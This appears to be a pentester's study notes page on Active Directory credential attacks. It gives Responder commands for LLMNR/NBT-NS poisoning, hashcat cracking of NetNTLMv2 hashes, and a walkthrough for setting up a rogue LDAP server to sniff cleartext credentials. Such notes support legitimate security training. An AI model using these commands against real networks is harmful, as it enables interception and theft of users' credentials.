## Passive
- [[Responder]]
	- Use analysis mode (passive, no responses)
- OSINT
- [[Wireshark]]/[[Tcpdump]]

## Active
- [[Nmap]]
- [[Fping]]
- [[Kerbrute]]
- LOLBins
TODO: Write this

# LLMNR/NBT-NS Poisoning

LLMNR poisoning works similarly to ARP poisoning. LLMNR is a protocol similar to DNS used inside AD environments. 

- [[Responder]] (Linux Hosts)
- [[Inveigh]] (Windows Hosts)
- [[Hashcat]]

```shell
responder -I <iface> -A # Listen only, do not poison
responder -I <iface> # Poison and intercept responses
```

Poisoning this connection with Responder or Inveigh provides us an opportunity to Falsify the LLMNR name and request authentication. These hashes are NetNTLMv2, which means they cannot be used in PTH attacks, but they can still be cracked with Hashcat in mode 5600. 

```shell
hashcat -m 5600 <NetNTLMv2> <wordlist>
```

This attack can be prevented only by disabling these protocols, which should be done carefully, as we are not always aware of what relies on what within our network. 

# Rogue LDAP
If you have control over where LDAP requests are being sent, perhaps on a networked and unsecured printer, you can configure a rogue LDAP server and sniff the cleartext credentials with Wireshark.

```shell
# Start a rogue LDAP server on Kali
apt install slapd ldap-utils
systemctl start slapd
dpkg-reconfigure -p low slapd
<select No>
<enter domain you are attacking/impersonating>
<re-enter domain you are impersonating>
<any password will work>
<select MDB>
<select No>
<select Yes>

echo "dn: cn=config" > olcSaslSecProps.ldif
echo "replace: olcSaslSecProps" >> olcSaslSecProps.ldif
echo "olcSaslSecProps: noanonymous,minssf=0,passcred" >> olcSaslSecProps.ldif

ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif
service slapd restart

tcpdump -SX -i <interface> tcp port 389
```

